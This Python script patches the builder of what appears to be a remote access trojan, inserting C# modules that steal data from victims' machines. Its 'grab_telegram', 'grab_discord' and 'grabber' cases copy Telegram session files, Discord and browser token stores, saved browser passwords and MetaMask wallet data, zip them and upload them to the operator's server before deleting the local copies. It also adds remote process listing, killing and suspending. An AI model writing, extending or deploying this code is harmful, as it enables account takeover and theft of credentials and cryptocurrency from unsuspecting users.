import re

with open('c:/Users/danya/Downloads/baron-main/server.py', 'r', encoding='utf-8') as f:
    server_py = f.read()

# 1. Update Usings
if 'using System.IO.Compression;' not in server_py:
    server_py = server_py.replace(
        '        "using System.Collections.Concurrent;\\n"',
        '        "using System.Collections.Concurrent;\\n"\\\n        "using System.IO.Compression;\\n"\\\n        "using System.IO.Compression.FileSystem;\\n"'
    )

# 2. Add ZIP Uploader Helper Function
zip_helper = r"""
        "        static void UploadZip(string zipPath, string moduleName) {\n"
        "            try {\n"
        "                if (!File.Exists(zipPath)) return;\n"
        "                byte[] fileBytes = File.ReadAllBytes(zipPath);\n"
        "                var req = (HttpWebRequest)WebRequest.Create(_server + \"/api/upload\");\n"
        "                req.Method = \"POST\"; req.ContentType = \"application/octet-stream\";\n"
        "                req.Headers.Add(\"X-Client-ID\", _clientId);\n"
        "                req.Headers.Add(\"X-Filename\", moduleName + \"_\" + Environment.UserName + \".zip\");\n"
        "                req.Timeout = 120000;\n"
        "                using (var s = req.GetRequestStream()) s.Write(fileBytes, 0, fileBytes.Length);\n"
        "                req.GetResponse().Close();\n"
        "                File.Delete(zipPath);\n"
        "                Res(\"success\", moduleName + \" uploaded successfully to server.\");\n"
        "            } catch (Exception ex) { Res(\"error\", moduleName + \" upload failed: \" + ex.Message); }\n"
        "        }\n\n"
"""
# Insert before ScanNetwork
server_py = server_py.replace('        "        static string ScanNetwork() {\\n"\\\n', zip_helper + '        "        static string ScanNetwork() {\\n"\\\n')

# 3. Create the New Grabber C# blocks
grabber_new_switch = r"""
                case "grab_telegram":
                    new Thread(() => {
                        try {
                            Res("info", "Packing Telegram tdata...");
                            string tgDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop\\tdata");
                            if (!Directory.Exists(tgDir)) { Res("error", "Telegram not found."); return; }
                            string tmpDir = Path.Combine(Path.GetTempPath(), "tg_" + Guid.NewGuid().ToString("N"));
                            Directory.CreateDirectory(tmpDir); // Copy logic to avoid file locks
                            foreach (string f in Directory.GetFiles(tgDir, "*", SearchOption.AllDirectories)) {
                                try {
                                    if (f.Contains("user_data") || f.Contains("temp") || f.EndsWith(".json")) continue;
                                    string dest = f.Replace(tgDir, tmpDir);
                                    Directory.CreateDirectory(Path.GetDirectoryName(dest));
                                    File.Copy(f, dest, true);
                                } catch {}
                            }
                            string zipPath = Path.Combine(Path.GetTempPath(), "tg_grab.zip");
                            if (File.Exists(zipPath)) File.Delete(zipPath);
                            ZipFile.CreateFromDirectory(tmpDir, zipPath, CompressionLevel.Fastest, false);
                            Directory.Delete(tmpDir, true);
                            UploadZip(zipPath, "Telegram");
                        } catch (Exception ex) { Res("error", "TG Grabber: " + ex.Message); }
                    }) { IsBackground = true }.Start();
                    break;

                case "grab_discord":
                    new Thread(() => {
                        try {
                            Res("info", "Packing Discord Tokens...");
                            string tmpDir = Path.Combine(Path.GetTempPath(), "disc_" + Guid.NewGuid().ToString("N"));
                            Directory.CreateDirectory(tmpDir);
                            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                            string localapp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                            string[] paths = {
                                Path.Combine(appdata, "discord", "Local Storage", "leveldb"),
                                Path.Combine(appdata, "discordcanary", "Local Storage", "leveldb"),
                                Path.Combine(appdata, "discordptb", "Local Storage", "leveldb"),
                                Path.Combine(localapp, "Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"),
                                Path.Combine(localapp, "Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb")
                            };
                            bool found = false;
                            foreach (string p in paths) {
                                if (!Directory.Exists(p)) continue;
                                found = true;
                                string pName = new DirectoryInfo(p).Parent.Parent.Name;
                                string dPath = Path.Combine(tmpDir, pName);
                                Directory.CreateDirectory(dPath);
                                foreach(string f in Directory.GetFiles(p)) {
                                    try { File.Copy(f, Path.Combine(dPath, Path.GetFileName(f)), true); } catch {}
                                }
                            }
                            if (!found) { Res("error", "No Discord installs found."); return; }
                            string zipPath = Path.Combine(Path.GetTempPath(), "discord_grab.zip");
                            if (File.Exists(zipPath)) File.Delete(zipPath);
                            ZipFile.CreateFromDirectory(tmpDir, zipPath, CompressionLevel.Fastest, false);
                            Directory.Delete(tmpDir, true);
                            UploadZip(zipPath, "Discord_LevelDB");
                        } catch (Exception ex) { Res("error", "DC Grabber: " + ex.Message); }
                    }) { IsBackground = true }.Start();
                    break;
                    
                case "grabber":
                    new Thread(() => {
                        try {
                            Res("info", "Ultimate Grabber Initiated...");
                            string txt = StealBrowserPasswords();
                            string zipPath = Path.Combine(Path.GetTempPath(), "browsers_grab.zip");
                            if (File.Exists(zipPath)) File.Delete(zipPath);
                            string tmpDir = Path.Combine(Path.GetTempPath(), "bz_" + Guid.NewGuid().ToString("N"));
                            Directory.CreateDirectory(tmpDir);
                            File.WriteAllText(Path.Combine(tmpDir, "passwords.txt"), txt);
                            
                            // add metamask/exodus
                            string mwDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn");
                            if(Directory.Exists(mwDir)) {
                                string dDest = Path.Combine(tmpDir, "MetaMask");
                                Directory.CreateDirectory(dDest);
                                foreach(string f in Directory.GetFiles(mwDir)) { try { File.Copy(f, Path.Combine(dDest, Path.GetFileName(f))); } catch {} }
                            }
                            ZipFile.CreateFromDirectory(tmpDir, zipPath, CompressionLevel.Optimal, false);
                            Directory.Delete(tmpDir, true);
                            UploadZip(zipPath, "Browsers_And_Wallets");
                        } catch(Exception ex) { Res("error", "Grabber: " + ex.Message); }
                    }) { IsBackground = true }.Start();
                    break;
"""

# Process manager rewrite (JSON)
process_new_switch = r"""
                case "processes":
                    new Thread(() => {
                        try {
                            var list = new List<string>();
                            foreach (var p in Process.GetProcesses()) {
                                try {
                                    list.Add("{\"pid\":" + p.Id + ",\"name\":\"" + p.ProcessName + "\",\"mem\":" + (p.WorkingSet64 / 1048576).ToString() + ",\"title\":\"" + p.MainWindowTitle.Replace("\"", "\\\"") + "\"}");
                                } catch {}
                            }
                            string json = "[" + string.Join(",", list) + "]";
                            Res("processes_data", json);
                        } catch (Exception ex) { Res("error", "Procs: " + ex.Message); }
                    }) { IsBackground = true }.Start();
                    break;

                case "kill_proc":
                    try {
                        int pid = int.Parse(task["pid"]);
                        Process.GetProcessById(pid).Kill();
                        Res("success", "Process " + pid + " killed.");
                    } catch (Exception ex) { Res("error", "Kill failed: " + ex.Message); }
                    break;

                case "suspend_proc":
                    try {
                        int pid = int.Parse(task["pid"]);
                        IntPtr h = Process.GetProcessById(pid).Handle;
                        NtSuspendProcess(h);
                        Res("success", "Process " + pid + " suspended.");
                    } catch (Exception ex) { Res("error", "Suspend failed: " + ex.Message); }
                    break;

                case "resume_proc":
                    try {
                        int pid = int.Parse(task["pid"]);
                        IntPtr h = Process.GetProcessById(pid).Handle;
                        NtResumeProcess(h);
                        Res("success", "Process " + pid + " resumed.");
                    } catch (Exception ex) { Res("error", "Resume failed: " + ex.Message); }
                    break;
"""

old_grabber_match = re.search(r'case "grabber":.*?break;', server_py, re.DOTALL)
old_proc_match = re.search(r'case "processes":.*?break;', server_py, re.DOTALL)

# P/Invoke NT routines
nt_routines = r"""
        [DllImport("ntdll.dll", SetLastError = true)] static extern int NtSuspendProcess(IntPtr processHandle);
        [DllImport("ntdll.dll", SetLastError = true)] static extern int NtResumeProcess(IntPtr processHandle);
"""

if old_grabber_match and old_proc_match:
    # We turn the string representation into properly escaped strings for the generator
    grab_payload = "\n".join(['        "' + line.replace('"', '\\"') + '\\n"' for line in grabber_new_switch.strip().split("\n")])
    proc_payload = "\n".join(['        "' + line.replace('"', '\\"') + '\\n"' for line in process_new_switch.strip().split("\n")])
    nt_payload = "\n".join(['        "' + line.replace('"', '\\"') + '\\n"' for line in nt_routines.strip().split("\n")])
    
    # Do replacing
    server_py = server_py.replace('        "        // ==== Network Scanner ====\\n"', nt_payload + '\n        "        // ==== Network Scanner ====\\n"')
    
    server_py = server_py.replace("\n".join(['        "' + line.replace('"', '\\"') + '\\n"' for line in old_grabber_match.group(0).split("\n")]), grab_payload)
    server_py = server_py.replace("\n".join(['        "' + line.replace('"', '\\"') + '\\n"' for line in old_proc_match.group(0).split("\n")]), proc_payload)
    
    with open('c:/Users/danya/Downloads/baron-main/server.py', 'w', encoding='utf-8') as f:
        f.write(server_py)
    print("BACKEND C# GENERATOR PATCHED")
else:
    print("MATCH FAILED", bool(old_grabber_match), bool(old_proc_match))

